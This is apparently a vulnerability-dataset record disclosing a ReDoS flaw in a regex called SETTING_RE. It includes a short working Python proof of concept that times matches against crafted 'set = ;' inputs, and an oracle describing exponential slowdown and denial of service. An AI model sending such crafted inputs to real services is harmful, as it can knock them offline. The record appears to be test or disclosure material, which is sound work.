title: Inefficient regular expression complexity in SETTING_RE regex leading to ReDoS
trigger_payload:
import re
import time
SETTING_RE = re.compile(
    r"^set\s+[A-Za-z\s_]+=[A-Za-z\d\s.\"#$%&'()*+,-/:<=>?@\[\]^_`{|}~]+(?:;\s*[A-Z\s_]+=[A-Za-z\d\s.\"#$%&'()*+,-/:<=>?@\[\]^_`{|}~]+)*")
for i in range(1, 50):
    payload = "set = ;" + " = ;" * i
    start = time.time()
    result = re.match(SETTING_RE, payload)
    end = time.time()
    print("Thời gian thực hiện: {:.4f} giây, len = {}".format(end - start, len(payload)))
oracle: Exponential increase in processing time when matching the regex with crafted input, leading to high CPU usage and potential denial of service
